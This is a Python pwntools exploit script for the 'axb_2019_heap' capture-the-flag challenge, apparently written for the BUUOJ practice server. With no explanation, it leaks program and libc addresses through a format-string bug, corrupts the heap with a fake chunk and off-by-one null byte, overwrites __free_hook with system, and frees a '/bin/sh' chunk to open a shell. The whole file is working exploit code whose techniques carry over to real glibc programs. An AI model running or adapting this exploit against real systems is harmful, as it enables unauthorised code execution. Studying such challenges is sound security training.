#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/22 18:28:34
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
debug = 0
if debug:
    sh = process("axb_2019_heap")
else:
    sh = remote("node3.buuoj.cn",27421)
elf = ELF("axb_2019_heap")
#libc = ELF()

def cmd(choice):
    sh.recvuntil(">> ")
    sh.sendline(str(choice))
def add(index,size,content):
    cmd(1)
    sh.recvuntil("Enter the index you want to create (0-10):")
    sh.sendline(str(index))
    sh.recvuntil("Enter a size:\n")
    sh.sendline(str(size))
    sh.recvuntil("Enter the content: \n")
    sh.sendline(content)

def dele(index):
    cmd(2)
    sh.recvuntil("Enter an index:\n")
    sh.sendline(str(index))

def edit(index,content):
    cmd(4)
    sh.recvuntil("Enter an index:\n")
    sh.sendline(str(index))
    sh.recvuntil("Enter the content: \n")
    sh.sendline(content)
sh.recvuntil("Enter your name: ")
sh.sendline("%11$p%15$p")

sh.recvuntil("Hello, 0x")
base_addr = int(sh.recv(12),16) - 0x1186
sh.recvuntil("0x")
libc_start_main = int(sh.recv(12),16) - 240
libc = LibcSearcher('__libc_start_main',libc_start_main)
libc_base = libc_start_main - libc.dump('__libc_start_main')
log.info("success leak base_addr:0x%x"%base_addr)
log.info("success leak libc_base:0x%x"%libc_base)
system_addr = libc_base + libc.dump('system')
free_hook = libc_base + libc.dump('__free_hook')
bss_addr = base_addr + 0x202060
log.info("success leak note_addr:0x%x"%bss_addr)
add(0,0xf8,"aaaa")
add(1,0xf8,"aaaa")
add(2,0xf8,"aaaa")
add(3,0xf8,"/bin/sh\x00")
payload = p64(0) + p64(0xf1) + p64(bss_addr - 0x18) + p64(bss_addr - 0x10) + 'a' * 0xd0 + p64(0xf0) + p8(0)
edit(0,payload)
dele(1)
payload = p64(0) * 3 + p64(free_hook) + p64(0x9) #size
edit(0,payload)
edit(0,p64(system_addr))
dele(3)

sh.interactive()
#add(0x)
